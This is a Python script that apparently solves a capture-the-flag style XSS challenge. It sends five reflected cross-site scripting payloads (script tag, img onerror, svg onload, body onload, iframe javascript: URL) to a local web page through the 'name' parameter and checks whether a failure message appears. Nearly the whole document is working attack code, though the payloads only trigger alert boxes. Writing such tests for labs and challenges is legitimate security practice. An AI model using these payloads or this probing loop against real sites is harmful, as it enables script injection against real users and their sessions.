"""
XSS Payload Tester - Tests multiple XSS payloads containing 'XSS' string
Target: http://127.0.0.1:33081/page?name=[PAYLOAD]
"""
import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33081/page"

# XSS payloads to test - all include 'XSS' string as required
payloads = [
    ("script_tag", "<script>alert('XSS')</script>"),
    ("img_onerror", "<img src=x onerror=alert('XSS')>"),
    ("svg_onload", "<svg onload=alert('XSS')>"),
    ("body_onload", "<body onload=alert('XSS')>"),
    ("iframe_javascript", '<iframe src="javascript:alert(\'XSS\')"></iframe>')
]

print("[*] Starting XSS payload testing...")
print(f"[*] Target URL: {base_url}")
print(f"[*] Testing {len(payloads)} different payloads\n")

successful_payloads = []

for payload_name, payload in payloads:
    print(f"[TEST] Payload type: {payload_name}")
    print(f"[TEST] Raw payload: {payload}")
    
    # URL encode the payload for query parameter
    encoded_payload = urllib.parse.quote(payload, safe='')
    print(f"[TEST] URL encoded: {encoded_payload}")
    
    # Construct full URL
    full_url = f"{base_url}?name={encoded_payload}"
    print(f"[TEST] Full URL: {full_url}")
    
    try:
        # Send GET request
        response = requests.get(full_url, timeout=10)
        print(f"[RESPONSE] Status Code: {response.status_code}")
        print(f"[RESPONSE] Content Length: {len(response.content)} bytes")
        
        # Extract the solution-text div if present
        solution_match = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', response.text, re.DOTALL)
        if solution_match:
            solution_content = solution_match.group(1).strip()
            print(f"[RESPONSE] solution-text content: {solution_content[:500]}")
            
            # Check for success indicators
            if "Failed! Try again!" in solution_content:
                print(f"[-] Result: FAILED - Try again message present")
                
                # Check if payload is being filtered or encoded
                if payload in response.text:
                    print(f"[INFO] Raw payload found in response - may be reflected but not executed")
                elif encoded_payload in response.text:
                    print(f"[INFO] Encoded payload found in response")
                else:
                    print(f"[INFO] Payload not found in response - may be filtered")
            else:
                print(f"[+] Result: POTENTIAL SUCCESS - No failure message!")
                successful_payloads.append({
                    'name': payload_name,
                    'payload': payload,
                    'encoded': encoded_payload
                })
        else:
            print(f"[-] Result: solution-text div not found in response")
        
        # Print response snippet for analysis
        print(f"[RESPONSE] First 2000 chars of response:\n{response.text[:2000]}")
        print("-" * 80)
        
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        print("-" * 80)

print(f"\n[*] Testing complete!")
print(f"[*] Found {len(successful_payloads)} potentially successful payloads")

if successful_payloads:
    print("\n[+] SUCCESSFUL PAYLOADS:")
    for i, sp in enumerate(successful_payloads, 1):
        print(f"\n{i}. Name: {sp['name']}")
        print(f"   Raw payload: {sp['payload']}")
        print(f"   URL encoded: {sp['encoded']}")
else:
    print("\n[-] No successful payloads found in this test batch")
